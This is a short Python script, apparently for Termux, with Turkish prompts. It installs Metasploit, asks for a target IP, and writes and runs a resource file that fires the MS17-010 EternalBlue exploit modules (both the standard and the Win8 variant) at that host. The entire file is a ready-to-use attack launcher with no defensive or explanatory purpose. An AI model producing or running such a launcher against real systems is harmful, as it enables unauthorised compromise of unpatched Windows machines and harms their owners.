#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import io

os.system("pkg install figlet")
os.system("pkg install unstable-repo")
os.system("pkg install msfconsole")
os.system("clear")
os.system("figlet MS17")

hedef = input("Hedef IP : ")

ths = open("ms17-010-metasploit.txt", "w")
ths.write("use exploit/windows/smb/ms17_010_eternalblue")
ths.write("\nset RHOSTS " + hedef )
ths.write("\nexploit")

ths.write("\nuse exploit/windows/smb/ms17_010_eternalblue_win8")
ths.write("\nset RHOSTS " + hedef )
ths.write("\nexploit")

ths.close()

os.system("msfconsole -r ms17-010-metasploit.txt")
